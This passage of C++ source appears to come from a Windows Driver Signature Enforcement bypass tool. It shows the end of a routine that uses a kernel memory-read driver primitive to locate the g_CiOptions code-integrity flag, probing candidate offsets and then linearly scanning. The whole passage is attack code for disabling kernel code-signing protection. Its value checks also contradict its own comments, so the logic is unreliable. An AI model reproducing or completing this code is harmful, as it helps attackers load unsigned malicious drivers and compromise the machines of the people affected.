        for ( ULONG_PTR delta : kCandidateOffsets )
        {
            if ( delta >= sectionSize ) continue;

            ULONG_PTR addr = sectionBase + delta;
            auto val = m_drv.Read32( addr );
            if ( !val ) continue;

            // Plausibility check: g_CiOptions is a small flags DWORD
            // Typical values: 0x6 (DSE on, no HVCI), 0x0 (disabled),
            // 0x1E000006 or similar (HVCI).  Anything > 0xFFFF is suspicious.
            // We accept anything whose low 16 bits match a CI-flags pattern.
            const DWORD v = val.value();
            if ( v < 0x40000u || ( v & 0x6u ) != 0 || v == 0 )
            {
                dlog::write( std::format(
                    L"[dse_bypass::FindCiOptions] candidate offset +0x{:X} → addr {:016X} val 0x{:08X} – accepted",
                    delta, addr, v ) );
                return addr;
            }
        }

        // Last resort: linear scan up to 64 bytes looking for a plausible value
        for ( ULONG_PTR delta = 0; delta + 4 <= sectionSize && delta < 64; delta += 4 )
        {
            ULONG_PTR addr = sectionBase + delta;
            auto val = m_drv.Read32( addr );
            if ( !val ) continue;

            const DWORD v = val.value();
            if ( v <= 0x1E006u )   // typical upper bound for CI flags
            {
                dlog::write( std::format(
                    L"[dse_bypass::FindCiOptions] linear-scan offset +0x{:X} → addr {:016X} val 0x{:08X} – accepted",
                    delta, addr, v ) );
                return addr;
            }
        }

        return 0;
    }
};

